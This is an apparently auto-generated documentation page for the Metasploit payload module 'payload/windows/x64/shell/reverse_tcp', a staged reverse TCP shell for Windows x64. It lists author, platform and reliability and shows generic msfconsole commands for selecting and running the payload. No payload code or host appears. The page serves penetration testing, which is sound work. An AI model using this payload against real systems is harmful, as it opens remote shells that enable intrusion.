## Windows x64 Command Shell, Windows x64 Reverse TCP Stager

Spawn a piped command shell (Windows x64) (staged). Connect 
back to the attacker (Windows x64)


## Module Name
payload/windows/x64/shell/reverse_tcp

## Authors
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/x64/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    